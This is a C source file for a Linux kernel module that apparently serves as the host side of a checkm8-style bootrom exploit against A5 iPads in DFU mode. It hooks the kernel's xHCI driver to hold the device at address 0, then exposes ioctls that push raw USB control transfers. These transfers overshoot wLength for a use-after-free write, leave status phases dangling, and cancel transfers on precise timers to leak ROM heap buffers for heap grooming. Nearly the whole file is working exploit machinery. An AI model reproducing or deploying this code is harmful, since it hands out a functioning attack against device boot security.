// raw0 - keep the DFU iPad at USB address 0 AND push raw phase-level EP0
// TDs through the kernel's own live xHCI.
//
// Part 1 (addr0 behavior): ftrace-IPMODIFY hook on xhci_queue_address_device
// forces arg5 (enum xhci_setup_dev) to SETUP_CONTEXT_ONLY, so the Address
// Device command carries TRB_BSR: the xHC never sends SET_ADDRESS, the slot
// context address stays 0, and all wire tokens for this device carry
// address 0 - the pristine DFU-ROM heap condition (verified tonight: the
// feng-shui spray is actually served by the ROM, 128 bytes per request).
//
// Part 2 (raw0 addition): the same hook captures arg1 (struct xhci_hcd *)
// and arg4 (slot_id). Userspace can then ioctl PUSH a raw control TD:
// a SETUP TRB, a chain of DATA TRBs of ARBITRARY total length (overshoot
// past wLength - the UAF write), and an OPTIONAL STATUS TRB (omit it to
// leave incomplete transactions that dangle the ROM's data-phase buffer).
// TDs are queued on the device's own EP0 ring with the kernel's exact
// enqueue/link semantics; fire-and-forget (final TRB without IOC when no
// status phase is requested), doorbell rung directly. Compiled against the
// exact running kernel source; struct layouts match by inclusion.

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/spinlock.h>
#include <linux/ftrace.h>
#include <linux/kprobes.h>
#include <linux/version.h>
#include <linux/delay.h>
#include <linux/hrtimer.h>
#include <linux/ktime.h>
#include <linux/dma-mapping.h>
#include <linux/usb.h>
#include <linux/usb/hcd.h>

#include "xhci.h"

#define RAW0_VID 0x05ac
#define RAW0_PID 0x1227

#define RAW0_IOCBASE 'R'
#define RAW0_IOC_PUSH _IOW(RAW0_IOCBASE, 1, struct raw0_txn)
#define RAW0_IOC_INFO _IOR(RAW0_IOCBASE, 2, struct raw0_info)
#define RAW0_IOC_STATE _IOR(RAW0_IOCBASE, 3, struct raw0_state)
#define RAW0_IOC_LEAK _IOW(RAW0_IOCBASE, 4, struct raw0_leak)
#define RAW0_IOC_CYC  _IOW(RAW0_IOCBASE, 5, struct raw0_cyc)

#define RAW0_MAX_DATA 0x1000

struct raw0_txn {
	__u8 setup[8];      /* the 8 wire setup bytes (IDT data) */
	__u32 data_len;     /* 0 = setup-only or setup+status */
	__u8 has_data;      /* send a data phase at all */
	__u8 has_status;    /* send a status phase (0 = incomplete TD) */
	__u8 dir_in;       /* data phase direction */
	__u8 pad0;
	__u64 user_data;   /* data source (user pointer, data_len bytes) */
	__u32 flags;        /* reserved */
	__u32 pad1;
} __attribute__((packed));

struct raw0_state {
	__u64 xhci_addr;
	__u32 slot_id;
	__u32 ring_addr_lo;
	__u32 num_trbs_free;
	__u32 cycle_state;
	__u32 state;      /* 0 = no capture yet, 1 = captured+sane */
	__u32 trbs_pushed;
	__u32 deq_off;    /* ring->dequeue position, TRB index (relative) */
	__u32 ep0_state;  /* chip's EP0 context DW0: 0=disabled 1=running 3=stopped */
};

/*
 * LEAK: submit a control URB on the captured device and cancel it
 * cancel_us microseconds later via an hrtimer - in-kernel timing,
 * no userspace latency. The URB rides the kernel's own cancel
 * machinery (Stop Endpoint + Set TR Dequeue) to die mid-transfer:
 * the wire never emits the status phase, so the A5 DFU ROM leaks
 * its per-request io_buffer - the sketch's feng-shui primitive,
 * finally reproducible on this AMD xHC.
 * data_len may EXCEED wLength (in the setup packet): kernel-internal
 * control URBs are not truncated to wLength - the overshoot the
 * usbfs layer forbids, which is the stage-3 UAF write.
 */
struct raw0_leak {
	__u8 setup[8];      /* the 8 wire setup bytes (wLength matters) */
	__u32 data_len;     /* transfer length (may exceed setup wLength) */
	__u8 has_data;
	__u8 dir_in;
	__u8 complete;      /* 1 = wait for full completion, no cancel */
	__u8 pad0;
	__u32 cancel_us;    /* hrtimer cancel delay for !complete */
	__u32 pad1;
	__u64 user_data;    /* data source pointer */
} __attribute__((packed));

/*
 * CYC: the halt-recovery leak cycle (the ledger's open loophole).
 * Per xHCI spec 4.12.2 a Setup Stage TRB arriving while a control
 * transfer is incomplete = Sequence Error + endpoint HALTED. The
 * kernel does not recover halts caused by module-pushed TDs (td_list
 * mismatch), but the chip honors the spec: Reset Endpoint with the
 * TSP (soft reset) bit transitions Halted -> Running without
 * touching ring pointers. So one wire-leak per cycle:
 *   push dangling TD (setup+data, no status) [+prior dangling
 *   pending -> xHC halts at the new SETUP TRB] -> settle -> poll
 *   EP0 ctx for Halted -> queue Reset Endpoint (STOP-TSP via
 *   xhci_queue_reset_ep, kallsyms-resolved; commands ride the
 *   kernel's own cmd_list lifecycle) -> poll Running.
 * The halted-then-resumed SETUP then executes on the wire: the ROM
 * parses a fresh request, serves its data phase, and never receives
 * the status phase of the previous one - the dangling leak.
 * Return: 0 = full cycle, 1 = first cycle (no prior dangling, the
 * TD executed immediately), negative = errno.
 */
struct raw0_cyc {
	__u8 setup[8];
	__u32 data_len;     /* data phase length on the wire */
	__u8 has_data;
	__u8 dir_in;
	__u16 pad0;
	__u32 settle_us;    /* post-push settle before halt polling */
	__u32 pad1;
	__u64 user_data;    /* data source (Overshoot-capable) */
} __attribute__((packed));

/* ------------------------------------------------------------------ */
/* hook state                                                          */

static unsigned long target_addr;
static struct ftrace_ops raw0_ops;

static struct xhci_hcd *g_xhci; /* captured at address-device time */
static int g_slot = -1;
static struct usb_device *g_udev; /* captured alongside, for URB submits */

/* per-push staging (single ioctl at a time via xhci lock + mutex) */
static DEFINE_MUTEX(raw0_mtx);
static void *staging;          /* kernel buffer for data phase */
static dma_addr_t staging_dma;
static int staging_mapped;     /* persistent once the xhci is known:
                                * dangling TDs keep the xHC fetching
                                * staging long after the ioctl returns,
                                * so the mapping must outlive every push
                                * (per-push unmap caused AMD-Vi IO page
                                * faults that wedged EP0). */
static u32 g_trbs_pushed;
static u32 g_cyc_outstanding;

static void notrace raw0_hook(unsigned long ip, unsigned long parent_ip,
                              struct ftrace_ops *op, struct ftrace_regs *fregs)
{
	struct pt_regs *regs;
	struct usb_hcd *hcd;
	struct usb_device *udev;
	u16 vid;

	if (!fregs)
		return;
	regs = ftrace_get_regs(fregs);
	if (!regs)
		return;

	hcd = (struct usb_hcd *)regs->di;   /* arg1 */
	udev = (struct usb_device *)regs->si; /* arg2 */
	if (!hcd || !udev)
		return;

	/*
	 * iPad-only gate. On a fresh connect the core has read only the
	 * first 8 descriptor bytes (no VID/PID yet): gate on high speed,
	 * the only high-speed device on this bus. Once the full descriptor
	 * is in (resets, re-addressing of a known device), gate on the
	 * exact 05ac:1227 DFU IDs.
	 */
	vid = le16_to_cpu(udev->descriptor.idVendor);
	if (vid == 0) {
		if (udev->speed != USB_SPEED_HIGH)
			return;
	} else if (vid != RAW0_VID ||
	           le16_to_cpu(udev->descriptor.idProduct) != RAW0_PID) {
		return;
	}

	/* arg3 (rdx): enum xhci_setup_dev -> SETUP_CONTEXT_ONLY (BSR=1) */
	regs->dx = 0;

	/* capture while we are here */
	g_xhci = hcd_to_xhci(hcd);
	g_slot = udev->slot_id;
	g_udev = udev;
}

/* ------------------------------------------------------------------ */
/* ring enqueue: faithful replica of the kernel's queue_trb/inc_enq    */

/*
 * The hardware's current EP0 dequeue DMA pointer, from the device
 * context. Dangling TDs produce no events, so the kernel's cached
 * ring->dequeue never advances past them - only the xHC's own copy
 * does. AMD/Cezanne xHCs use 64-byte contexts, so read the EP0
 * context at both +32 and +64 and keep whichever pointer lands
 * inside the ring segment.
 */
static u32 raw0_hw_deq_idx(struct xhci_hcd *xhci, int slot,
                           struct xhci_ring *ring)
{
	struct xhci_virt_device *virt = xhci->devs[slot];
	struct xhci_container_ctx *oc;
	dma_addr_t seg_dma;
	u64 deq;
	u32 off, idx;
	int base;

	if (!virt || !virt->out_ctx || !ring->first_seg)
		return (u32)-1;
	oc = virt->out_ctx;
	seg_dma = ring->first_seg->dma;

	for (base = 32; base <= 64; base += 32) {
		/* EP0 context: TR Dequeue Pointer lo at DW2 (+8), hi at DW3 */
		off = base + 8;
		deq = le32_to_cpu(*(__le32 *)(oc->bytes + off));
		deq |= (u64)le32_to_cpu(*(__le32 *)(oc->bytes + off + 4)) << 32;
		/* low nibble holds dcs; the ring is 16-byte aligned */
		if (deq < seg_dma || deq >= seg_dma + TRBS_PER_SEGMENT * 0x10)
			continue;
		idx = (u32)((deq - seg_dma) >> 4);
		if (idx < TRBS_PER_SEGMENT)
			return idx;
	}
	return (u32)-1;
}

static bool trb_is_link_rep(union xhci_trb *t)
{
	return TRB_TYPE_LINK_LE32(t->link.control);
}

static void inc_enq_past_link_rep(struct xhci_ring *ring, u32 chain)
{
	/*
	 * Give this link TRB to the hardware, then move to the next segment.
	 * Mirrors inc_enq_past_link() without the 0.95 chain quirk: the kernel
	 * only writes chain on link TRBs for HCs that need it; for normal
	 * xHC (>=0.96, incl. ours) the kernel rewrites chain - we do the same.
	 */
	ring->enqueue->link.control &= cpu_to_le32(~TRB_CHAIN);
	ring->enqueue->link.control |= cpu_to_le32(chain);
	wmb();
	ring->enqueue->link.control ^= cpu_to_le32(TRB_CYCLE);

	if (le32_to_cpu(ring->enqueue->link.control) & LINK_TOGGLE)
		ring->cycle_state ^= 1;

	ring->enq_seg = ring->enq_seg->next;
	ring->enqueue = ring->enq_seg->trbs;
}

static int queue_trb_rep(struct xhci_ring *ring, u64 param, u32 status,
                         u32 control_field, bool more_coming)
{
	union xhci_trb *trb;
	u32 chain;

	if (trb_is_link_rep(ring->enqueue))
		inc_enq_past_link_rep(ring, 0);
	if (trb_is_link_rep(ring->enqueue)) /* degenerate two-trb segments */
		return -ENOSPC;

	trb = ring->enqueue;
	trb->generic.field[0] = cpu_to_le32((u32)param);
	trb->generic.field[1] = cpu_to_le32((u32)(param >> 32));
	trb->generic.field[2] = cpu_to_le32(status);
	wmb();
	trb->generic.field[3] = cpu_to_le32(control_field |
	                                    (ring->cycle_state ? 1u : 0u));
	chain = control_field & TRB_CHAIN;
	ring->enqueue++;
	if (trb_is_link_rep(ring->enqueue) && (chain || more_coming))
		inc_enq_past_link_rep(ring, chain);
	return 0;
}

/* ------------------------------------------------------------------ */
/* the push                                                            */

static struct xhci_ring *live_ep0_ring(struct xhci_hcd *xhci, int slot)
{
	struct xhci_virt_device *virt;

	if (!xhci || slot <= 0 || slot >= MAX_HC_SLOTS)
		return NULL;
	virt = xhci->devs[slot];
	if (!virt || !virt->eps[0].ring)
		return NULL;
	return virt->eps[0].ring;
}

static int raw0_push(const struct raw0_txn *t)
{
	struct xhci_hcd *xhci = g_xhci;
	struct xhci_ring *ring;
	unsigned long flags;
	u64 setup_param;
	u32 trbs = 1; /* setup */
	int rc = 0;
	u32 off = 0, remain;
	u32 i;

	if (t->has_data)
		trbs += (t->data_len + 0x3f) / 0x40;
	if (t->has_status)
		trbs += 1;

	mutex_lock(&raw0_mtx);
	if (!xhci || g_slot < 0) {
		rc = -ENOTTY;
		goto out;
	}
	ring = live_ep0_ring(xhci, g_slot);
	if (!ring) {
		rc = -ENODEV;
		goto out;
	}
	if (t->data_len > RAW0_MAX_DATA) {
		rc = -EMSGSIZE;
		goto out;
	}
	/* live ring headroom: EP0 rings are single-segment (256 TRBs,
	 * self-linked). The AMD xHC does not expose its live dequeue
	 * pointer in the EP context (reads 0), and dangling TDs never
	 * produce events, so the kernel's cached dequeue only advances
	 * when a status-completing URB runs after them - the orchestrator
	 * pumps such a URB every 16 pushes. Leave 16 TRBs of margin. */
	{
		u32 enq_idx, deq_idx, used;

		if (ring->enq_seg != ring->first_seg ||
		    ring->deq_seg != ring->first_seg) {
			rc = -EIO;
			goto out;
		}
		enq_idx = ring->enqueue - ring->first_seg->trbs;
		deq_idx = (u32)(ring->dequeue - ring->first_seg->trbs);
		used = (enq_idx - deq_idx) & (TRBS_PER_SEGMENT - 1);
		if (used + trbs + 16 > TRBS_PER_SEGMENT) {
			rc = -ENOSPC;
			goto out;
		}
	}
	if (t->has_data && t->data_len && t->user_data) {
		if (copy_from_user(staging,
			(const void __user *)(unsigned long)t->user_data,
			t->data_len)) {
			rc = -EFAULT;
			goto out;
		}
		if (!staging_mapped) {
			struct device *dma_dev =
				xhci_to_hcd(xhci)->self.sysdev;
			staging_dma = dma_map_single(dma_dev, staging,
				RAW0_MAX_DATA, DMA_BIDIRECTIONAL);
			if (dma_mapping_error(dma_dev, staging_dma)) {
				rc = -EIO;
				goto out;
			}
			staging_mapped = 1;
		}
	} else if (t->has_data) {
	}
	wmb();

	setup_param = le64_to_cpu(*(__le64 *)t->setup);

	spin_lock_irqsave(&xhci->lock, flags);

	/* SETUP TRB: len 8, IDT immediate data, TX type from direction */
	{
		u32 setup_ctl = TRB_TYPE(TRB_SETUP) | TRB_IDT | TRB_CHAIN;

		if (t->has_data)
			setup_ctl |= TRB_TX_TYPE(t->dir_in ? TRB_DATA_IN :
						             TRB_DATA_OUT);
		rc = queue_trb_rep(ring, setup_param, 8, setup_ctl,
		                   true /* more TRBs coming */);
		if (rc)
			goto unlock;
	}

	if (t->has_data && t->data_len) {
		remain = (t->data_len + 0x3f) / 0x40;
		for (i = 0; i < remain; i++) {
			u32 chunk = min_t(u32, 0x40, t->data_len - off);
			u32 data_ctl = TRB_TYPE(TRB_DATA);

			if (t->dir_in)
				data_ctl |= TRB_DIR_IN;
			if (i + 1 < remain)
				data_ctl |= TRB_CHAIN;
			rc = queue_trb_rep(ring, staging_dma + off, chunk,
			                   data_ctl,
			                   (i + 1 < remain) || t->has_status);
			if (rc)
				goto unlock;
			off += chunk;
		}
	} else if (t->has_data) {
		/* zero-length data phase: a normal USB status-less sequence
		 * with wLength=0 never has a data phase; treat as no-data */
		rc = -EINVAL;
		goto unlock;
	}

	if (t->has_status) {
		u32 status_ctl = TRB_TYPE(TRB_STATUS) | TRB_IOC;

		if (!t->has_data)
			status_ctl |= TRB_DIR_IN; /* no-data control: status IN */
		rc = queue_trb_rep(ring, 0, 0, status_ctl, false);
		if (rc)
			goto unlock;
	}

	/* doorbell: EP0 target = 1 for the captured slot */
	writel(DB_VALUE(0, 0), &xhci->dba->doorbell[g_slot]);

unlock:
	if (rc == 0)
		g_trbs_pushed += trbs;
	spin_unlock_irqrestore(&xhci->lock, flags);
out:
	mutex_unlock(&raw0_mtx);
	return rc;
}

/* ------------------------------------------------------------------ */
/* CYC: halt-recovery leak cycle (see struct raw0_cyc)                */

static struct xhci_command *(*p_alloc_cmd)(struct xhci_hcd *, bool, gfp_t);
static void (*p_free_cmd)(struct xhci_hcd *, struct xhci_command *);
static int (*p_queue_reset_ep)(struct xhci_hcd *, struct xhci_command *,
                               int, unsigned int, enum xhci_ep_reset_type);
static void (*p_ring_cmd_db)(struct xhci_hcd *);

static void *(*kallsyms_one)(const char *name);

static void *resolve_sym(const char *name)
{
	/* register_kprobe resolves any symbol (static or exported) -
	 * the same trick the hook registration uses. */
	struct kprobe kp = { .symbol_name = NULL };
	void *addr;

	if (kallsyms_one) {
		addr = kallsyms_one(name);
		if (addr)
			return addr;
	}
	kp.symbol_name = name;
	if (register_kprobe(&kp) < 0)
		return NULL;
	addr = kp.addr;
	unregister_kprobe(&kp);
	return addr && addr != (void *)-1 ? addr : NULL;
}

/*
 * EP0 context state from the output device context. This AMD chip
 * uses 64-byte contexts: EP0 ctx DW0 sits at bytes+64. Probe both
 * offsets and keep the one with a sane low nibble.
 */
static u32 raw0_ep0_state(struct xhci_hcd *xhci, int slot)
{
	struct xhci_virt_device *v = xhci->devs[slot];
	u32 s;

	if (!v || !v->out_ctx)
		return 0xFF;
	s = le32_to_cpu(*(__le32 *)(v->out_ctx->bytes + 64));
	if ((s & 0x7) <= 3)
		return s & 0x7;
	s = le32_to_cpu(*(__le32 *)(v->out_ctx->bytes + 32));
	if ((s & 0x7) <= 3)
		return s & 0x7;
	return 0xFF;
}

static int raw0_cyc(const struct raw0_cyc *c)
{
	struct xhci_hcd *xhci = g_xhci;
	struct xhci_virt_device *vdev;
	struct xhci_ring *ring;
	unsigned long flags;
	u64 setup_param;
	u32 trbs, off, remain, i;
	int rc = 0;
	ktime_t t0;
	struct xhci_command *cmd;

	if (!xhci || g_slot < 0)
		return -ENODEV;
	if (!p_queue_reset_ep || !p_alloc_cmd || !p_free_cmd ||
	    !p_ring_cmd_db)
		return -EOPNOTSUPP;
	vdev = xhci->devs[g_slot];
	if (!vdev || !vdev->eps[0].ring)
		return -ENODEV;
	ring = vdev->eps[0].ring;
	if (c->data_len > RAW0_MAX_DATA)
		return -EMSGSIZE;

	mutex_lock(&raw0_mtx);

	/* copy data into staging (persistent DMA mapping) */
	if (c->has_data && c->data_len && c->user_data) {
		if (copy_from_user(staging,
			(const void __user *)(unsigned long)c->user_data,
			c->data_len)) {
			rc = -EFAULT;
			goto out;
		}
		if (!staging_mapped) {
			struct device *dm = xhci_to_hcd(xhci)->self.sysdev;
			staging_dma = dma_map_single(dm, staging,
				RAW0_MAX_DATA, DMA_BIDIRECTIONAL);
			if (dma_mapping_error(dm, staging_dma)) {
				rc = -EIO;
				goto out;
			}
			staging_mapped = 1;
		}
		wmb();
	}

	trbs = 1 + (c->has_data ? (c->data_len + 0x3f) / 0x40 : 0);

	spin_lock_irqsave(&xhci->lock, flags);
	/* simple headroom check against our own outstanding count; the
	 * xHC consumes the previous cycle's TRBs so this stays tiny */
	if (g_cyc_outstanding + trbs + 32 > TRBS_PER_SEGMENT) {
		spin_unlock_irqrestore(&xhci->lock, flags);
		rc = -ENOSPC;
		goto out;
	}
	setup_param = le64_to_cpu(*(__le64 *)c->setup);
	{
		u32 setup_ctl = TRB_TYPE(TRB_SETUP) | TRB_IDT | TRB_CHAIN;
		if (c->has_data)
			setup_ctl |= TRB_TX_TYPE(c->dir_in ? TRB_DATA_IN :
			                          TRB_DATA_OUT);
		rc = queue_trb_rep(ring, setup_param, 8, setup_ctl, true);
		if (rc)
			goto unlock;
	}
	if (c->has_data && c->data_len) {
		remain = (c->data_len + 0x3f) / 0x40;
		off = 0;
		for (i = 0; i < remain; i++) {
			u32 chunk = min_t(u32, 0x40, c->data_len - off);
			u32 data_ctl = TRB_TYPE(TRB_DATA);
			if (c->dir_in)
				data_ctl |= TRB_DIR_IN;
			if (i + 1 < remain)
				data_ctl |= TRB_CHAIN;
			rc = queue_trb_rep(ring, staging_dma + off, chunk,
			                  data_ctl, (i + 1 < remain));
			if (rc)
				goto unlock;
			off += chunk;
		}
	}
	writel(DB_VALUE(0, 0), &xhci->dba->doorbell[g_slot]);
	g_cyc_outstanding += trbs;
unlock:
	spin_unlock_irqrestore(&xhci->lock, flags);
	if (rc)
		goto out;

	/* settle: let the xHC fetch and hit the sequence-error halt */
	if (c->settle_us)
		udelay(c->settle_us);

	/* poll for Halted (state 2) - but the FIRST cycle (no prior
	 * dangling) executes immediately and never halts */
	t0 = ktime_get();
	while (ktime_us_delta(ktime_get(), t0) < 3000) {
		if (raw0_ep0_state(xhci, g_slot) == 2)
			break;
		udelay(20);
	}
	if (raw0_ep0_state(xhci, g_slot) != 2) {
		/* no halt: either first-ever cycle (fine) or the TD ran
		 * - report 1 so the tool knows no recovery was needed */
		rc = 1;
		goto out;
	}

	/* Halted: recover with Reset Endpoint, soft reset (TSP) */
	cmd = p_alloc_cmd(xhci, true, GFP_KERNEL);
	if (!cmd) {
		rc = -ENOMEM;
		goto out;
	}
	spin_lock_irqsave(&xhci->lock, flags);
	rc = p_queue_reset_ep(xhci, cmd, g_slot, 0, EP_SOFT_RESET);
	if (rc == 0)
		p_ring_cmd_db(xhci);
	spin_unlock_irqrestore(&xhci->lock, flags);
	if (rc) {
		p_free_cmd(xhci, cmd);
		goto out;
	}
	if (!wait_for_completion_timeout(cmd->completion,
	                                 msecs_to_jiffies(100))) {
		p_free_cmd(xhci, cmd);
		rc = -ETIMEDOUT;
		goto out;
	}
	rc = cmd->status;
	p_free_cmd(xhci, cmd);
	if (rc != 0) {
		rc = -EIO;
		goto out;
	}

	/* poll for Running */
	t0 = ktime_get();
	while (ktime_us_delta(ktime_get(), t0) < 3000) {
		if (raw0_ep0_state(xhci, g_slot) == 1)
			break;
		udelay(20);
	}
	rc = 0;
out:
	/* every TRB we ever pushed has been consumed by the xHC once the
	 * cycle completes (halted SETUP executed after recovery, data
	 * phase served, previous dangles left behind on the wire) */
	if (rc >= 0)
		g_cyc_outstanding = 0;
	mutex_unlock(&raw0_mtx);
	return rc;
}

static struct usb_device *leak_udev;   /* held reference */
static struct urb *leak_urb;
static unsigned char *leak_setup;      /* 8 bytes */
static unsigned char *leak_data;       /* RAW0_MAX_DATA */
static struct hrtimer leak_timer;
static struct work_struct leak_work;    /* unlink from process context */
static struct completion leak_done;
static int leak_inflight;

/*
 * usb_unlink_urb() is process-context only. The hrtimer callback runs
 * in hardirq context (calling unlink there hard-freeze the box on the
 * first night run), so the timer only schedules this worker.
 */
static void leak_work_cb(struct work_struct *w)
{
	if (leak_urb)
		usb_unlink_urb(leak_urb);
}

static enum hrtimer_restart leak_timer_cb(struct hrtimer *t)
{
	schedule_work(&leak_work);
	return HRTIMER_NORESTART;
}

static void leak_complete(struct urb *urb)
{
	complete(&leak_done);
}

/*
 * Submit one control URB on the captured device with the given setup
 * and data (staging-copied). If cancel_us > 0, an hrtimer unlinks the
 * URB after the delay; else we wait for natural completion.
 */
static int raw0_leak(const struct raw0_leak *l)
{
	unsigned int pipe;
	int rc = 0;
	unsigned long ret;

	if (leak_inflight)
		return -EBUSY;
	if (!g_udev)
		return -ENODEV;
	if (l->has_data && l->data_len && l->data_len > RAW0_MAX_DATA)
		return -EMSGSIZE;

	if (!leak_udev) {
		leak_udev = usb_get_dev(g_udev);
		if (!leak_udev)
			return -ENODEV;
		leak_setup = kmalloc(8, GFP_KERNEL);
		leak_data = kmalloc(RAW0_MAX_DATA, GFP_KERNEL);
		leak_urb = usb_alloc_urb(0, GFP_KERNEL);
		if (!leak_setup || !leak_data || !leak_urb)
			return -ENOMEM;
		hrtimer_setup(&leak_timer, leak_timer_cb,
		              CLOCK_MONOTONIC, HRTIMER_MODE_REL);
		INIT_WORK(&leak_work, leak_work_cb);
	}

	memcpy(leak_setup, l->setup, 8);
	if (l->has_data && l->data_len && l->user_data) {
		if (copy_from_user(leak_data,
			(const void __user *)(unsigned long)l->user_data,
			l->data_len))
			return -EFAULT;
	} else {
		memset(leak_data, 0, RAW0_MAX_DATA);
	}

	pipe = (l->dir_in ? usb_rcvctrlpipe(leak_udev, 0) :
	        usb_sndctrlpipe(leak_udev, 0));
	usb_fill_control_urb(leak_urb, leak_udev, pipe, leak_setup,
	                    leak_data, l->has_data ? l->data_len : 0,
	                    leak_complete, NULL);
	reinit_completion(&leak_done);
	leak_inflight = 1;

	rc = usb_submit_urb(leak_urb, GFP_KERNEL);
	if (rc) {
		leak_inflight = 0;
		return rc;
	}

	if (l->complete) {
		ret = wait_for_completion_timeout(&leak_done, HZ);
	} else {
		hrtimer_start(&leak_timer,
		              ns_to_ktime(l->cancel_us * 1000ULL),
		              HRTIMER_MODE_REL);
		ret = wait_for_completion_timeout(&leak_done, HZ);
		hrtimer_try_to_cancel(&leak_timer);
	}
	cancel_work_sync(&leak_work);
	leak_inflight = 0;
	if (!ret) {
		/* straggler: kill before anyone reuses the URB */
		usb_kill_urb(leak_urb);
		return -ETIMEDOUT;
	}
	return leak_urb->status;
}



static dev_t raw0_devt;
static struct cdev raw0_cdev;
static struct class *raw0_class;

static int raw0_open(struct inode *inode, struct file *file)
{
	return 0;
}

static int raw0_release(struct inode *inode, struct file *file)
{
	return 0;
}

static long raw0_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
	struct raw0_txn t;
	struct raw0_leak lk;
	struct raw0_cyc cyc;
	struct raw0_state st;

	switch (cmd) {
	case RAW0_IOC_PUSH:
		if (copy_from_user(&t, (void __user *)arg, sizeof(t)))
			return -EFAULT;
		return raw0_push(&t);
	case RAW0_IOC_LEAK:
		if (copy_from_user(&lk, (void __user *)arg, sizeof(lk)))
			return -EFAULT;
		return raw0_leak(&lk);
	case RAW0_IOC_CYC:
		if (copy_from_user(&cyc, (void __user *)arg, sizeof(cyc)))
			return -EFAULT;
		return raw0_cyc(&cyc);
	case RAW0_IOC_STATE:
		memset(&st, 0, sizeof(st));
		st.xhci_addr = (u64)(uintptr_t)g_xhci;
		st.slot_id = (u32)g_slot;
		st.trbs_pushed = g_trbs_pushed;
		if (g_xhci && g_slot > 0) {
			struct xhci_ring *r = live_ep0_ring(g_xhci, g_slot);
			if (r) {
				st.ring_addr_lo = (u32)(uintptr_t)r;
				st.cycle_state = r->cycle_state;
				st.state = 1;
				st.deq_off = (u32)(r->dequeue -
					r->first_seg->trbs);
				st.num_trbs_free = raw0_hw_deq_idx(g_xhci, g_slot,
					r);
				{
					struct xhci_virt_device *virt =
						g_xhci->devs[g_slot];
					struct xhci_container_ctx *oc = virt->out_ctx;
					/* EP0 context is context index 1 at byte offset 32 */
					st.ep0_state = (u32)le32_to_cpu(
						*(__le32 *)(oc->bytes + 32));
				}
			}
		}
		if (copy_to_user((void __user *)arg, &st, sizeof(st)))
			return -EFAULT;
		return 0;
	}
	return -EINVAL;
}

static const struct file_operations raw0_fops = {
	.owner = THIS_MODULE,
	.open = raw0_open,
	.release = raw0_release,
	.unlocked_ioctl = raw0_ioctl,
};

/* ------------------------------------------------------------------ */

static int __init raw0_init(void)
{
	struct kprobe kp = { .symbol_name = "xhci_setup_device" };
	struct device *dmdev;
	int ret;

	ret = register_kprobe(&kp);
	if (ret < 0) {
		pr_err("raw0: kprobe resolve failed: %d\n", ret);
		return ret;
	}
	target_addr = (unsigned long)kp.addr;
	unregister_kprobe(&kp);
	if (!target_addr)
		return -ENOENT;

	raw0_ops.func = raw0_hook;
	raw0_ops.flags = FTRACE_OPS_FL_SAVE_REGS_IF_SUPPORTED |
	                 FTRACE_OPS_FL_IPMODIFY;
	ret = ftrace_set_filter_ip(&raw0_ops, target_addr, 0, 0);
	if (ret) {
		pr_err("raw0: ftrace_set_filter_ip: %d\n", ret);
		return ret;
	}
	ret = register_ftrace_function(&raw0_ops);
	if (ret) {
		pr_err("raw0: register_ftrace_function: %d\n", ret);
		return ret;
	}
	pr_info("raw0: hooking xhci_setup_device at %px "
	        "(BSR=1 + xhci/slot capture)\n", (void *)target_addr);

	kallsyms_one = (void *(*)(const char *))
		resolve_sym("kallsyms_lookup_name");
	p_alloc_cmd = resolve_sym("xhci_alloc_command");
	p_free_cmd = resolve_sym("xhci_free_command");
	p_queue_reset_ep = resolve_sym("xhci_queue_reset_ep");
	p_ring_cmd_db = resolve_sym("xhci_ring_cmd_db");
	if (!p_alloc_cmd || !p_free_cmd || !p_queue_reset_ep ||
	    !p_ring_cmd_db) {
		pr_err("raw0: command symbold resolution failed\n");
		ret = -ENOENT;
		goto err_hook;
	}
	pr_info("raw0: cycle engine ready (alloc_cmd=%px queue_reset_ep=%px "
	        "ring_cmd_db=%px)\n", p_alloc_cmd, p_queue_reset_ep,
	        p_ring_cmd_db);

	ret = alloc_chrdev_region(&raw0_devt, 0, 1, "raw0");
	if (ret)
		goto err_hook;
	cdev_init(&raw0_cdev, &raw0_fops);
	raw0_cdev.owner = THIS_MODULE;
	ret = cdev_add(&raw0_cdev, raw0_devt, 1);
	if (ret)
		goto err_chr;
	raw0_class = class_create("raw0");
	if (IS_ERR(raw0_class)) {
		ret = PTR_ERR(raw0_class);
		goto err_cdev;
	}
	dmdev = device_create(raw0_class, NULL, raw0_devt, NULL, "raw0");
	if (IS_ERR(dmdev)) {
		ret = PTR_ERR(dmdev);
		goto err_class;
	}

	staging = kmalloc(RAW0_MAX_DATA, GFP_KERNEL);
	if (!staging) {
		ret = -ENOMEM;
		goto err_dev;
	}
	/* dma map against the xhci controller once captured; use NULL device
	 * coherency meanwhile - the buffer is only ever read via streaming
	 * dma, so map at first push time against xhci_to_hcd(g_xhci)... to
	 * keep it simple we use dma_map_single on the controller at capture
	 * time is impossible here; we assume coherent<4GB via
	 * dma_map_single(NULL,...) fallback below. */
	pr_info("raw0: ready - /dev/raw0 (push raw phase-level EP0 TDs)\n");
	return 0;

err_dev:
	device_destroy(raw0_class, raw0_devt);
err_class:
	class_destroy(raw0_class);
err_cdev:
	cdev_del(&raw0_cdev);
err_chr:
	unregister_chrdev_region(raw0_devt, 1);
err_hook:
	unregister_ftrace_function(&raw0_ops);
	return ret;
}

static void __exit raw0_exit(void)
{
	/* leak plumbing - only tear down if it was ever initialized
	 * (hrtimer_cancel on a zeroed hrtimer crashes the kernel) */
	if (leak_urb) {
		hrtimer_cancel(&leak_timer);
		cancel_work_sync(&leak_work);
		usb_free_urb(leak_urb);
	}
	kfree(leak_setup);
	kfree(leak_data);
	if (leak_udev)
		usb_put_dev(leak_udev);
	if (staging_mapped && g_xhci)
		dma_unmap_single(xhci_to_hcd(g_xhci)->self.sysdev,
		                 staging_dma, RAW0_MAX_DATA,
		                 DMA_BIDIRECTIONAL);
	staging_mapped = 0;
	kfree(staging);
	device_destroy(raw0_class, raw0_devt);
	class_destroy(raw0_class);
	cdev_del(&raw0_cdev);
	unregister_chrdev_region(raw0_devt, 1);
	unregister_ftrace_function(&raw0_ops);
	pr_info("raw0: unloaded\n");
}

module_init(raw0_init);
module_exit(raw0_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("A5 checkm8 host: BSR-1 address hook + raw phase-level EP0 TD pusher on the live kernel xHCI");
